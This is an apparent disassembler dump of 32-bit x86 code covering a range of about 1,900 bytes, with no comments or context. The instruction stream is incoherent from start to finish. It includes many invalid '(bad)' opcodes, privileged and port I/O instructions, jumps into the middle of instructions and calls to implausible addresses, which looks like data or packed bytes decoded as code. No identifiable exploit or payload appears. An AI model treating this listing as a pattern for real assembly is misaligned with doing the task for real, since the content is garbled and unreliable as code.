  41a008:	mov    ebp,DWORD PTR [eax]
  41a00a:	clc    
  41a00b:	retf   0xff55
  41a00e:	push   ecx
  41a00f:	mov    DWORD PTR ds:0x757210,eax
  41a015:	mov    ecx,DWORD PTR [ebp-0x4]
  41a018:	sub    esp,DWORD PTR [ebx-0x77]
  41a01b:	dec    DWORD PTR [eax*4-0x74ca8abb]
  41a022:	or     ah,bh
  41a024:	pop    es
  41a025:	ds pushf 
  41a027:	push   DWORD PTR [edx]
  41a029:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  41a02f:	(bad)  
  41a030:	mov    bh,bh
  41a032:	jmp    0x41a020
  41a034:	leave  
  41a035:	jne    0x41a03f
  41a037:	call   0x2e9991
  41a03c:	in     al,dx
  41a03d:	dec    ebp
  41a03e:	add    dh,BYTE PTR [ebx]
  41a040:	add    BYTE PTR [ebx],al
  41a042:	inc    ebp
  41a043:	cmp    esi,DWORD PTR [ecx]
  41a045:	je     0x419fe3
  41a047:	mov    eax,edi
  41a049:	or     al,0xf0
  41a04b:	add    BYTE PTR [ebp+0x458bf845],al
  41a051:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  41a057:	adc    al,0x7
  41a059:	enter  0x9fc0,0xa5
  41a05d:	rol    BYTE PTR [eax],0x5e
  41a060:	mov    ecx,ecx
  41a062:	or     al,0xc
  41a064:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  41a06b:	jmp    0x41a06c
  41a06d:	push   ebp
  41a06e:	mov    esp,ebp
  41a070:	cld    
  41a071:	inc    ebp
  41a072:	inc    ebp
  41a073:	or     DWORD PTR [ecx+0x457dec10],0x0
  41a07a:	push   esi
  41a07b:	push   esi
  41a07c:	mov    edi,0x7af080f
  41a081:	add    bh,al
  41a083:	test   DWORD PTR [edi+ecx*1+0x3a732],ebx
  41a08a:	mov    DWORD PTR [edi],ecx
  41a08c:	adc    BYTE PTR [eax+0x45],al
  41a08f:	mov    ebp,eax
  41a091:	mov    ebp,edi
  41a093:	lock call edx
  41a096:	fcom   DWORD PTR [ebp+0x45]
  41a099:	mov    eax,0x148a8b
  41a09e:	push   ecx
  41a09f:	enter  0xc145,0x83
  41a0a3:	cmp    ecx,DWORD PTR [eax]
  41a0a5:	add    BYTE PTR [ebp+0x4d],al
  41a0a8:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  41a0ae:	call   0xffa19c1d
  41a0b3:	cmp    eax,DWORD PTR [ebp-0xc]
  41a0b6:	jmp    DWORD PTR [eax+edx*1-0x4e]
  41a0ba:	push   ebp
  41a0bb:	(bad)  
  41a0bc:	call   0x329ec0
  41a0c1:	mov    bh,0xdb
  41a0c3:	cld    
  41a0c4:	or     BYTE PTR [ebp+0x45],bl
  41a0c7:	(bad)  
  41a0c8:	call   0xff7b9d58
  41a0cd:	add    al,BYTE PTR [ebp+0x37]
  41a0d0:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  41a0d6:	jne    0x41a0d8
  41a0d8:	(bad)  
  41a0d9:	cmp    edi,esp
  41a0db:	jne    0x41a10e
  41a0dd:	mov    edi,edi
  41a0df:	or     BYTE PTR [ebx-0x307f0b49],cl
  41a0e5:	pop    ds
  41a0e6:	into   
  41a0e7:	je     0x41a0aa
  41a0e9:	mov    ebx,DWORD PTR [esi]
  41a0eb:	or     BYTE PTR [ebp-0x49],al
  41a0ee:	mov    esp,DWORD PTR [esi-0x77]
  41a0f1:	mov    esi,0x4451f0c
  41a0f6:	mov    eax,DWORD PTR [eax]
  41a0f8:	or     al,0x66
  41a0fa:	sar    bl,0x3b
  41a0fd:	xor    esi,DWORD PTR [ebp+0x66]
  41a100:	xor    ecx,edi
  41a102:	pop    edi
  41a103:	adc    bl,BYTE PTR [ebx+0x70]
  41a106:	ret    0xff
  41a109:	cld    
  41a10a:	inc    ebp
  41a10b:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  41a111:	cld    
  41a112:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  41a119:	push   0xffffff83
  41a11b:	pop    edi
  41a11c:	or     BYTE PTR [ebp+0x53],dh
  41a11f:	xorps  xmm1,xmm2
  41a122:	test   BYTE PTR [eax+eax*1],bh
  41a125:	add    BYTE PTR [eax],al
  41a127:	adc    eax,eax
  41a129:	add    DWORD PTR [eax+esi*2-0xff7b00],0xffffffb7
  41a131:	jmp    DWORD PTR [eax]
  41a133:	ror    al,0x5e
  41a136:	inc    ebp
  41a137:	leave  
  41a138:	xor    ecx,DWORD PTR [eax]
  41a13a:	and    DWORD PTR [ebx-0x3ec10708],ecx
  41a140:	add    ah,al
  41a142:	xor    edi,edi
  41a144:	xor    DWORD PTR [ebx],0x66003304
  41a14a:	mov    DWORD PTR [ebp-0xc],ecx
  41a14d:	pcmpgtw mm0,mm0
  41a150:	add    dl,ah
  41a152:	leave  
  41a153:	mov    edi,DWORD PTR [esi-0x7d]
  41a156:	push   ax
  41a158:	dec    ebp
  41a159:	mov    esi,DWORD PTR [ebx-0x75]
  41a15c:	lea    ebp,[eax-0x7c00ff04]
  41a162:	xor    eax,DWORD PTR [eax]
  41a164:	sysret 
  41a166:	dec    ebp
  41a167:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  41a16e:	push   WORD PTR [ecx+0x8]
  41a172:	jne    0x41a135
  41a174:	ud0    ecx,DWORD PTR [ecx]
  41a177:	mov    eax,edx
  41a179:	lods   al,BYTE PTR ds:[esi]
  41a17a:	add    BYTE PTR [eax],al
  41a17c:	data16 (bad) 
  41a17e:	iret   
  41a17f:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  41a186:	cli    
  41a187:	inc    ebp
  41a188:	cmp    al,0x8d
  41a18a:	add    BYTE PTR [esi+0x2d],ah
  41a18d:	inc    ebp
  41a18e:	pop    ebp
  41a18f:	lea    ecx,[edi]
  41a191:	mov    dl,bh
  41a193:	add    BYTE PTR [edi],cl
  41a195:	mov    DWORD PTR [eax+eax*8],edi
  41a198:	mov    ebx,0x3b87
  41a19d:	add    BYTE PTR [ebx],ch
  41a19f:	inc    ebp
  41a1a0:	data16 (bad) 
  41a1a2:	clc    
  41a1a3:	int3   
  41a1a4:	cmp    eax,DWORD PTR [eax]
  41a1a6:	je     0x41a131
  41a1a8:	push   0xffffffc8
  41a1aa:	pop    edi
  41a1ab:	xchg   DWORD PTR [ebp+0x0],eax
  41a1ae:	data16 add BYTE PTR [ebp+0x45],cl
  41a1b2:	lea    cx,[ebp+0x10]
  41a1b6:	jb     0x41a1b8
  41a1b8:	jmp    0x41a143
  41a1ba:	call   eax
  41a1bc:	clc    
  41a1bd:	xchg   DWORD PTR [edi+0x1],edi
  41a1c0:	mov    eax,DWORD PTR [eax]
  41a1c2:	or     BYTE PTR [ebp-0x49],al
  41a1c5:	lea    eax,[eax+0x74003154]
  41a1cb:	push   edi
  41a1cc:	inc    edx
  41a1cd:	jge    0x41a1ce
  41a1cf:	mov    DWORD PTR [edi],ecx
  41a1d1:	fdiv   DWORD PTR [edi-0x6]
  41a1d4:	inc    DWORD PTR [eax]
  41a1d6:	xor    edx,DWORD PTR [eax+0x5f]
  41a1d9:	xchg   DWORD PTR [ebx+0x1],ebx
  41a1dc:	ret    0x0
  41a1df:	xor    BYTE PTR [ebp-0x51],cl
  41a1e2:	cmp    edi,0xf0ff89fc
  41a1e8:	data16 ror al,0x84
  41a1ec:	rol    BYTE PTR [eax],0x3b
  41a1ef:	add    al,dh
  41a1f1:	dec    eax
  41a1f2:	xchg   esp,eax
  41a1f3:	push   ebx
  41a1f4:	jmp    0x41a181
  41a1f6:	push   ebp
  41a1f7:	add    esp,ebp
  41a1f9:	add    ebp,esp
  41a1fb:	mov    edx,DWORD PTR [edi+0x24]
  41a1fe:	clc    
  41a1ff:	dec    esi
  41a200:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  41a206:	cmp    BYTE PTR [ebx],al
  41a208:	jne    0x41a193
  41a20a:	xor    esp,eax
  41a20c:	jmp    0x44a38f
  41a211:	add    ebp,DWORD PTR [ecx+ecx*4]
  41a214:	jne    0x41a20a
  41a216:	call   0xffcb9f70
  41a21b:	clc    
  41a21c:	xchg   edi,eax
  41a21d:	sti    
  41a21e:	add    DWORD PTR [ebx],eax
  41a220:	add    BYTE PTR [ebp+0x47],bl
  41a223:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  41a229:	pop    ebp
  41a22a:	mov    DWORD PTR [esi-0x48],esi
  41a22d:	jmp    0x41a276
  41a22f:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  41a235:	(bad)  
  41a237:	cmp    al,0x0
  41a239:	cmp    eax,DWORD PTR [ebp+0x18]
  41a23c:	lea    ebx,[ebp-0x56]
  41a23f:	jle    0x41a241
  41a241:	jae    0x41a1cc
  41a243:	mov    eax,esp
  41a245:	call   0xb900:0x8b005587
  41a24c:	inc    ebp
  41a24d:	push   ebp
  41a24e:	lea    ecx,[ebp-0x27ff4f12]
  41a254:	mov    eax,edi
  41a256:	int3   
  41a257:	push   ebp
  41a258:	xchg   edi,eax
  41a25a:	add    esp,ebp
  41a25c:	add    BYTE PTR [eax],al
  41a25e:	inc    ebp
  41a25f:	add    BYTE PTR [ebp+0x8b3255],cl
  41a265:	cld    
  41a266:	mov    DWORD PTR [edx],edi
  41a268:	aam    0x75
  41a26a:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  41a270:	mov    DWORD PTR [ebx-0x50],edx
  41a273:	test   BYTE PTR [ebp-0x1],0xe8
  41a277:	mov    eax,DWORD PTR [eax]
  41a279:	hlt    
  41a27a:	add    al,al
  41a27c:	mov    eax,DWORD PTR ds:0x890045a8
  41a282:	dec    DWORD PTR [ebx+0x45fdf0e8]
  41a288:	inc    DWORD PTR [eax*2+0xf75854d]
  41a28f:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  41a295:	call   0x7297ffd6
  41a29a:	je     0x41a2fa
  41a29c:	js     0x41a2fd
  41a29e:	lock ret 0x7e
  41a2a2:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  41a2a8:	mov    edi,edi
  41a2aa:	sbb    al,bl
  41a2ac:	clc    
  41a2ad:	add    BYTE PTR [ebp-0x73],bh
  41a2b0:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  41a2b6:	ror    BYTE PTR [eax],1
  41a2b8:	dec    ebp
  41a2b9:	xchg   ebp,eax
  41a2ba:	mov    edi,edi
  41a2bc:	in     al,0x8b
  41a2be:	jge    0x41a249
  41a2c0:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  41a2c6:	clc    
  41a2c7:	pop    esi
  41a2c8:	fist   DWORD PTR [ebp+0x5d398b5d]
  41a2ce:	clc    
  41a2cf:	add    al,0x6e
  41a2d1:	mov    eax,DWORD PTR [ebx]
  41a2d3:	mov    BYTE PTR [ebp+0x0],dl
  41a2d6:	mov    edx,DWORD PTR [ebx-0x20]
  41a2d9:	adc    esi,DWORD PTR [edi+0x5e005f3e]
  41a2df:	add    eax,0x3b3b73
  41a2e4:	adc    al,0x89
  41a2e6:	pop    eax
  41a2e7:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  41a2eb:	ret    0xf08
  41a2ee:	cmp    al,0x2
  41a2f0:	mov    edx,eax
  41a2f2:	cld    
  41a2f3:	add    BYTE PTR [ebp+0x66],dl
  41a2f6:	add    eax,ebx
  41a2f8:	add    esp,eax
  41a2fa:	sub    eax,eax
  41a2fc:	or     BYTE PTR [ecx-0x77f474bb],cl
  41a302:	add    BYTE PTR [eax],al
  41a304:	mov    DWORD PTR [ebx-0x24],ebx
  41a307:	push   edi
  41a308:	push   ebp
  41a309:	clc    
  41a30a:	add    DWORD PTR [esi+0x1b0100],0x45
  41a311:	out    0xff,eax
  41a313:	add    edx,DWORD PTR [eax]
  41a315:	jmp    0x41a2ff
  41a317:	cmp    ch,0x47
  41a31a:	(bad)  
  41a31b:	jmp    0x40c72b6d
  41a320:	je     0x41a2ac
  41a322:	mov    eax,DWORD PTR [eax-0x10c78f04]
  41a328:	inc    ebp
  41a329:	add    BYTE PTR [ebx-0x770375],al
  41a32f:	add    ah,ch
  41a331:	add    edx,esp
  41a333:	pop    edi
  41a334:	pop    ebp
  41a335:	push   ebp
  41a336:	inc    ebx
  41a337:	in     al,dx
  41a338:	pop    ebp
  41a339:	in     al,dx
  41a33a:	cmp    edx,DWORD PTR [edi-0x8]
  41a33d:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  41a344:	add    al,0x47
  41a346:	push   ebp
  41a347:	mov    esp,ebp
  41a349:	in     al,0x45
  41a34b:	dec    ebp
  41a34c:	push   esi
  41a34d:	test   DWORD PTR [eax+0xfb010f],esi
  41a353:	add    BYTE PTR [eax+0xc018b],dh
  41a359:	leave  
  41a35a:	inc    ebp
  41a35b:	test   al,ch
  41a35d:	add    dh,bh
  41a35f:	add    bh,bh
  41a361:	dec    ebp
  41a362:	push   cs
  41a363:	mov    DWORD PTR [ecx],eax
  41a365:	hlt    
  41a366:	push   es
  41a367:	dec    ebp
  41a368:	leave  
  41a369:	mov    DWORD PTR [eax],ecx
  41a36b:	clc    
  41a36c:	cmovge eax,ecx
  41a36f:	mov    ecx,0x85c2f0
  41a375:	clc    
  41a376:	pop    DWORD PTR [ebp+0x1]
  41a379:	push   ebx
  41a37a:	add    BYTE PTR [ebp-0x15],bh
  41a37d:	push   esi
  41a37e:	xor    eax,0x898a45
  41a383:	cld    
  41a384:	add    al,0x45
  41a386:	add    BYTE PTR [ebx],dh
  41a388:	pushfw 
  41a38a:	add    DWORD PTR [esi+0x78308c1],edi
  41a390:	add    ah,BYTE PTR [edi+esi*4-0x33]
  41a394:	mov    ebx,0xc4e8b
  41a399:	(bad)  
  41a39a:	cmp    ecx,ebx
  41a39c:	jne    0x41a366
  41a39e:	xor    ecx,DWORD PTR [ebp+0x66]
  41a3a1:	jmp    0xc8a3a7
  41a3a6:	add    DWORD PTR [ebp+0x0],eax
  41a3a9:	mov    eax,ebx
  41a3ab:	or     al,0x8b
  41a3ad:	(bad)  
  41a3ae:	mov    ecx,esi
  41a3b0:	mov    BYTE PTR [eax+eax*1+0x664c138],cl
  41a3b7:	mov    eax,edi
  41a3b9:	or     BYTE PTR [edx],cl
  41a3bb:	shl    cl,cl
  41a3bd:	icebp  
  41a3be:	add    BYTE PTR [ebp+0x37],0x8b
  41a3c2:	or     BYTE PTR [edx+eax*2],cl
  41a3c5:	(bad)  
  41a3c6:	or     cl,dh
  41a3c8:	stc    
  41a3c9:	shl    DWORD PTR [ebp-0x30],0xc6
  41a3cd:	xor    al,0x0
  41a3cf:	inc    ebp
  41a3d0:	xchg   BYTE PTR [ebx],al
  41a3d2:	add    esp,edi
  41a3d4:	add    BYTE PTR [ebp-0x39],cl
  41a3d7:	mov    al,bl
  41a3d9:	test   DWORD PTR [ebx+0x1c348375],ecx
  41a3df:	sub    al,0xbf
  41a3e1:	jmp    0x41a368
  41a3e3:	mov    edi,eax
  41a3e5:	lock jge 0x41a3d9
  41a3e8:	lea    esi,[edx-0x74bad501]
  41a3ee:	mov    ebp,esp
  41a3f0:	or     cl,dh
  41a3f2:	leave  
  41a3f3:	add    al,BYTE PTR [eax+eax*4-0x37ff9c00]
  41a3fa:	dec    ebp
  41a3fb:	dec    ebp
  41a3fc:	test   DWORD PTR [ebx],eax
  41a3fe:	paddb  mm6,mm0
  41a401:	add    DWORD PTR [eax],eax
  41a403:	dec    ebp
  41a404:	mov    ecx,DWORD PTR [ebx-0x63b217f0]
  41a40a:	mov    esi,DWORD PTR [edx]
  41a40c:	or     al,0x2b
  41a40e:	dec    ebp
  41a40f:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  41a415:	mov    esp,esi
  41a417:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  41a41e:	mov    DWORD PTR [ebx],ebp
  41a420:	call   0xc752d50
  41a425:	mov    DWORD PTR [ebp+0x10],ecx
  41a428:	(bad)  
  41a429:	push   0x8b85ff10
  41a42e:	clc    
  41a42f:	or     al,0x55
  41a431:	(bad)  
  41a432:	push   ecx
  41a433:	retf   
  41a434:	mov    ebx,0xff4d8dc8
  41a439:	mov    DWORD PTR [ebp+0x8],eax
  41a43c:	xor    eax,DWORD PTR [ebp-0x75]
  41a43f:	cmp    ebp,DWORD PTR [ebx]
  41a441:	lsl    ebx,WORD PTR [edi-0x8]
  41a445:	call   DWORD PTR [ebx-0x741bff75]
  41a44b:	(bad)  
  41a44c:	or     al,0x5b
  41a44e:	dec    ebp
  41a44f:	or     BYTE PTR [ebx],dh
  41a451:	inc    ebp
  41a452:	xor    esi,DWORD PTR ds:0x708088d
  41a458:	in     eax,0x9c
  41a45a:	add    BYTE PTR [edx],dh
  41a45c:	inc    ebp
  41a45d:	pop    edi
  41a45e:	xor    eax,edx
  41a460:	test   DWORD PTR [eax],0x83108b8b
  41a466:	dec    ebp
  41a467:	adc    al,0x33
  41a469:	inc    ebp
  41a46a:	xor    esi,DWORD PTR [ecx]
  41a46c:	sub    ebx,DWORD PTR [ebx+edi*1-0x74038a39]
  41a473:	test   DWORD PTR [eax],ecx
  41a475:	clc    
  41a476:	inc    ebp
  41a477:	add    ecx,DWORD PTR [ebx+0xc7f445]
  41a47d:	hlt    
  41a47e:	leave  
  41a47f:	test   DWORD PTR [esi],eax
  41a481:	clc    
  41a482:	inc    edi
  41a483:	push   edi
  41a484:	aaa    
  41a485:	inc    ebp
  41a486:	pop    ss
  41a487:	ror    DWORD PTR [ebp-0x29],1
  41a48a:	or     BYTE PTR [ebx+0x4d64fc55],0xd1
  41a491:	mov    eax,0x780084d
  41a496:	push   ebp
  41a497:	clc    
  41a498:	ret    0xe99c
  41a49b:	xor    dl,dl
  41a49d:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  41a4a3:	js     0x88830a2
  41a4a9:	dec    ebp
  41a4aa:	push   ebp
  41a4ab:	mov    edi,DWORD PTR [eax+0xc872fc]
  41a4b1:	lock enter 0xceca,0xf2
  41a4b6:	retf   0x18ce
  41a4b9:	jne    0x41a508
  41a4bb:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  41a4c1:	enter  0xf0d6,0xca
  41a4c5:	retf   0xf2c8
  41a4c8:	into   
  41a4c9:	out    dx,al
  41a4ca:	dec    ebp
  41a4cb:	dec    ebp
  41a4cc:	jmp    0xff45a404
  41a4d1:	xor    eax,DWORD PTR [ebp-0x15]
  41a4d4:	xor    esi,DWORD PTR [ebx]
  41a4d6:	mov    esi,DWORD PTR [ebx]
  41a4d8:	sub    eax,DWORD PTR [ebx]
  41a4da:	add    eax,DWORD PTR [ebx]
  41a4dc:	or     bl,dl
  41a4de:	dec    ebp
  41a4df:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  41a4e5:	xor    eax,DWORD PTR [ebp-0xf00073]
  41a4eb:	jb     0x41a532
  41a4ed:	add    BYTE PTR [ebx],dh
  41a4ef:	dec    ebp
  41a4f0:	pop    esi
  41a4f1:	mov    ebp,ebx
  41a4f3:	cld    
  41a4f4:	mov    esi,eax
  41a4f6:	call   0x520ffac3
  41a4fb:	stc    
  41a4fc:	add    eax,0x4572aa
  41a501:	pop    edi
  41a502:	leave  
  41a503:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  41a50a:	in     al,dx
  41a50b:	mov    eax,edi
  41a50d:	xor    eax,0xf8008520
  41a513:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  41a51a:	mov    eax,DWORD PTR [ebp-0x77]
  41a51d:	xor    al,bh
  41a51f:	pushf  
  41a520:	inc    ebp
  41a521:	(bad)  
  41a522:	cmp    eax,ebp
  41a524:	pushf  
  41a525:	xchg   BYTE PTR [esi-0x8],dl
  41a528:	mov    edi,0x8518e4ec
  41a52e:	jmp    0xf056:0x8b457df8
  41a535:	push   ebp
  41a536:	push   ebp
  41a537:	push   ecx
  41a538:	push   ecx
  41a539:	push   edi
  41a53a:	xor    eax,esi
  41a53c:	mov    edx,0x32729c
  41a541:	add    ecx,eax
  41a543:	mov    edx,edi
  41a545:	clc    
  41a546:	retf   0xaf45
  41a549:	cmp    ebx,ebp
  41a54b:	pushf  
  41a54c:	mov    eax,edi
  41a54e:	clc    
  41a54f:	cld    
  41a550:	jne    0x41a56a
  41a552:	xor    ebp,edx
  41a554:	xor    eax,DWORD PTR [ebp+0x3]
  41a557:	or     BYTE PTR [ebx],al
  41a559:	add    BYTE PTR [ebp-0x7747475],al
  41a55f:	hlt    
  41a560:	dec    ebp
  41a561:	dec    ebp
  41a562:	je     0x41a597
  41a564:	xor    esi,DWORD PTR [ebx]
  41a566:	xor    eax,DWORD PTR [ebx]
  41a568:	add    eax,DWORD PTR [ebx]
  41a56a:	add    ecx,DWORD PTR [edi]
  41a56c:	rol    ecx,cl
  41a56e:	mov    esi,DWORD PTR [ecx]
  41a570:	in     al,dx
  41a571:	inc    ebp
  41a572:	enter  0xca2b,0x33
  41a576:	icebp  
  41a577:	mov    DWORD PTR [edx],ecx
  41a579:	clc    
  41a57a:	lock pop ebp
  41a57c:	enter  0xf2e8,0xfe
  41a580:	retf   0xeeff
  41a583:	inc    ebp
  41a584:	jne    0x41a511
  41a586:	mov    edi,eax
  41a588:	cld    
  41a589:	dec    ebp
  41a58a:	enter  0xbc89,0x8d
  41a58e:	pushf  
  41a58f:	sti    
  41a590:	xor    bh,bh
  41a592:	mov    eax,DWORD PTR [ebp-0xc]
  41a595:	mov    esi,DWORD PTR [ebp-0x4]
  41a598:	xor    eax,esi
  41a59a:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9c]
  41a5a1:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  41a5a7:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  41a5ad:	(bad)  
  41a5ae:	push   ebp
  41a5af:	shr    esp,0x4d
  41a5b2:	in     al,dx
  41a5b3:	cmp    eax,DWORD PTR [esi+esi*2]
  41a5b6:	add    BYTE PTR [ebx-0x39ce1bbb],cl
  41a5bc:	pushf  
  41a5bd:	mov    edi,0x85c7f445
  41a5c3:	call   0xf8872cc0
  41a5c8:	xor    ebx,ebx
  41a5ca:	pushf  
  41a5cb:	popa   
  41a5cc:	push   ebx
  41a5cd:	dec    ebp
  41a5ce:	inc    ebp
  41a5cf:	mov    esi,DWORD PTR [esi]
  41a5d1:	clc    
  41a5d2:	pushf  
  41a5d3:	into   
  41a5d4:	mov    ecx,edi
  41a5d6:	in     al,dx
  41a5d7:	call   0x8b49eb9a
  41a5dc:	pop    es
  41a5dd:	or     BYTE PTR [ebx],dh
  41a5df:	or     BYTE PTR [edi+0x8a724d],bh
  41a5e5:	or     eax,edi
  41a5e7:	push   ebp
  41a5e8:	inc    ebp
  41a5e9:	cmpxchg8b (bad)
  41a5ea:	(bad)  
  41a5eb:	leave  
  41a5ec:	loopne 0x41a5b8
  41a5ee:	test   DWORD PTR [ebp-0x8],ecx
  41a5f1:	mov    eax,DWORD PTR [ebp-0x18]
  41a5f4:	rcl    DWORD PTR [ebp-0x29],1
  41a5f7:	xor    eax,edi
  41a5f9:	add    esi,eax
  41a5fb:	and    eax,DWORD PTR [eax]
  41a5fd:	mov    eax,DWORD PTR [eax]
  41a5ff:	(bad)  
  41a600:	leave  
  41a601:	sti    
  41a602:	inc    ebp
  41a603:	dec    DWORD PTR [ebx-0x39cc13ab]
  41a609:	mov    esi,ecx
  41a60b:	clc    
  41a60c:	(bad)  
  41a60d:	dec    ebp
  41a60e:	iret   
  41a60f:	xor    ebp,DWORD PTR [edi-0x74f71473]
  41a615:	jb     0x41a613
  41a617:	add    bh,al
  41a619:	inc    ebp
  41a61a:	(bad)  
  41a61b:	mov    eax,DWORD PTR [ebp-0xc]
  41a61e:	(bad)  
  41a61f:	xabort 0x64
  41a622:	loopne 0x41a5f1
  41a624:	jmp    FWORD PTR [ebx]
  41a626:	mov    DWORD PTR [ebx],eax
  41a628:	clc    
  41a629:	lock inc ebp
  41a62b:	dec    ebp
  41a62c:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  41a632:	loopne 0x41a667
  41a634:	inc    DWORD PTR [ebx]
  41a636:	mov    edi,DWORD PTR [ebx]
  41a638:	hlt    
  41a639:	jne    0x41a688
  41a63b:	mov    esi,DWORD PTR [ebx]
  41a63d:	in     al,0x8d
  41a63f:	dec    ebp
  41a640:	or     BYTE PTR [ebx],dh
  41a642:	jb     0x41a647
  41a644:	add    BYTE PTR [edi+0x45],bl
  41a647:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  41a64d:	add    BYTE PTR [ebx],dh
  41a64f:	mov    esi,DWORD PTR [ebx]
  41a651:	sub    DWORD PTR [ebx],0x6c
  41a654:	mov    eax,DWORD PTR [ebp-0x4]
  41a657:	xor    eax,ecx
  41a659:	pushf  
  41a65a:	mov    ecx,0x338545ba
  41a65f:	clc    
  41a660:	add    edx,DWORD PTR [ebp-0x77]
  41a663:	mov    edi,eax
  41a665:	adc    al,0x45
  41a667:	inc    ebp
  41a668:	mov    ebx,DWORD PTR ss:[esp+edx*1+0x1eb808b]
  41a670:	mov    eax,DWORD PTR [eax]
  41a672:	loopne 0x41a6c1
  41a674:	inc    ebp
  41a675:	mov    esi,DWORD PTR [ebx]
  41a677:	mov    eax,DWORD PTR [ebx]
  41a679:	nop
  41a67a:	rol    DWORD PTR [eax],cl
  41a67c:	mov    DWORD PTR [ebx+0x3c4503fc],ecx
  41a682:	mov    cl,BYTE PTR [ecx+0x450bf888]
  41a688:	dec    ebp
  41a689:	push   esi
  41a68a:	mov    edi,DWORD PTR [edi+0x7b608f8]
  41a690:	xor    eax,edi
  41a692:	mov    DWORD PTR [eax+ecx*1-0x74fcb2ce],ebx
  41a699:	mov    DWORD PTR [eax],ecx
  41a69b:	in     al,dx
  41a69c:	into   
  41a69d:	inc    ebp
  41a69e:	iret   
  41a69f:	xor    ecx,edx
  41a6a1:	add    ecx,DWORD PTR [ecx+ecx*4+0x45fff4e0]
  41a6a8:	mov    ecx,DWORD PTR [ebx-0x1735af04]
  41a6ae:	dec    ebp
  41a6af:	mov    DWORD PTR [ebx-0x31ba0b2c],ecx
  41a6b5:	mov    eax,DWORD PTR [eax+edi*1+0x48324d9c]
  41a6bc:	mov    DWORD PTR [ecx+0x8],eax
  41a6bf:	mov    eax,DWORD PTR [ebp-0x8]
  41a6c2:	xor    ebx,DWORD PTR [eax]
  41a6c4:	mov    ecx,0xff8b8d40
  41a6c9:	clc    
  41a6ca:	enter  0x4d49,0x48
  41a6ce:	mov    eax,edx
  41a6d0:	lock enter 0x4545,0x8b
  41a6d5:	mov    esi,eax
  41a6d7:	cmp    dh,al
  41a6d9:	rol    edi,0x3
  41a6dc:	enter  0x9140,0x89
  41a6e0:	inc    ebp
  41a6e1:	adc    al,0x8b
  41a6e3:	inc    ebp
  41a6e4:	clc    
  41a6e5:	xor    eax,esi
  41a6e7:	add    eax,edi
  41a6e9:	mov    DWORD PTR [esi-0x24],ebx
  41a6ec:	rol    DWORD PTR [ebp-0x37],0x33
  41a6f0:	add    al,0x3
  41a6f2:	push   ebp
  41a6f3:	mov    esp,ebp
  41a6f5:	fsubr  st,st(4)
  41a6f7:	inc    ebp
  41a6f8:	(bad)  
  41a6f9:	mov    edi,esp
  41a6fb:	adc    BYTE PTR [ebp+0x30c3f8c7],al
  41a701:	add    DWORD PTR [ebp+edx*2-0x27173877],ebx
  41a708:	inc    ebp
  41a709:	test   DWORD PTR [ecx+0x454514f8],ecx
  41a70f:	xor    cl,BYTE PTR [ebx+0xc7909c]
  41a715:	fmul   DWORD PTR [ebx+0xf81485]
  41a71b:	test   DWORD PTR [ecx+0x8b0100],ecx
  41a721:	cld    
  41a722:	or     edi,eax
  41a724:	dec    eax
  41a725:	ret    
  41a726:	push   ebx
  41a727:	inc    ebp
  41a728:	dec    ebp
  41a729:	mov    ecx,DWORD PTR [ebx+0x5745fc14]
  41a72f:	mov    DWORD PTR [ebp-0x14],edx
  41a732:	push   ecx
  41a733:	jne    0x41a768
  41a735:	mov    edi,DWORD PTR [ebx+0x4d720c]
  41a73b:	call   0xff879903
  41a740:	mov    eax,DWORD PTR [ebp-0x4]
  41a743:	mov    edi,0x4585c3d8
  41a749:	clc    
  41a74a:	mov    eax,DWORD PTR [ebp-0x8]
  41a74d:	xor    eax,DWORD PTR [eax+0x3]
  41a750:	adc    DWORD PTR [eax+0xc],0x45
  41a754:	inc    ebp
  41a755:	push   eax
  41a756:	mov    ebx,ebp
  41a758:	clc    
  41a759:	inc    DWORD PTR [eax-0x75]
  41a75c:	mov    esi,eax
  41a75e:	clc    
  41a75f:	rol    BYTE PTR [ebp+0x4545544e],0x33
  41a766:	je     0x41a76b
  41a768:	mov    edx,DWORD PTR [eax+0x38]
  41a76b:	jne    0x41a7ba
  41a76d:	lea    ecx,[ebx-0x817ab44]
  41a773:	mul    BYTE PTR [ebx]
  41a775:	dec    DWORD PTR [ebx+0x4089f845]
  41a77b:	fadd   DWORD PTR [ebx]
  41a77d:	inc    ebp
  41a77e:	jmp    0x41a70b
  41a780:	mov    ecx,DWORD PTR [esp+edx*2]
  41a783:	rol    DWORD PTR [ebp+0x45],0x8b
  41a787:	mov    edi,esp
  41a789:	lock (bad) 
  41a78b:	dec    ebp
  41a78c:	ret    
  41a78d:	mov    eax,DWORD PTR [ebp+0x10]
  41a790:	mov    eax,DWORD PTR [ecx-0x4]
  41a793:	mov    eax,edi
  41a795:	fadd   st,st(3)
  41a797:	enter  0x1645,0x8b
  41a79b:	inc    ebp
  41a79c:	cld    
  41a79d:	mov    ecx,DWORD PTR [ebp+0xc]
  41a7a0:	xor    ecx,DWORD PTR [ebp+0x3]
  41a7a3:	add    ecx,DWORD PTR [ecx-0x27b276f8]
